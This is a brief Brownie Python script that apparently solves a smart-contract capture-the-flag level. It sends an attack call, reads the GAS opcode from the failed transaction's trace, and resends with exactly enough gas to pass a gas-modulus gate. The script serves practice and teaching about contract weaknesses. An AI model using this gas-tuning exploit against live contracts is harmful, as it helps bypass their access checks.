from scripts.level_helper import *
from brownie.exceptions import VirtualMachineError

@setup_instance
def main(instance, player, attack):
    gasToForward = 5 * 8191
    gasLimit = 100000

    # first run fails, used to check gas usage
    try:
        attack.run(gasToForward, {'from': player, 'gas': gasLimit})
    except VirtualMachineError:
        print("Incorrect gas usage, calculating correct amount and resending...")

    print(history)
    # subtract 2 for GAS opcode itself
    gasLeft = [i for i in history[-1].trace if i['op'] == 'GAS'][0]['gas']-2
    gasUsed = gasToForward - gasLeft
    gasToForward += gasUsed

    attack.run(gasToForward, {'from': player, 'gas': gasLimit})



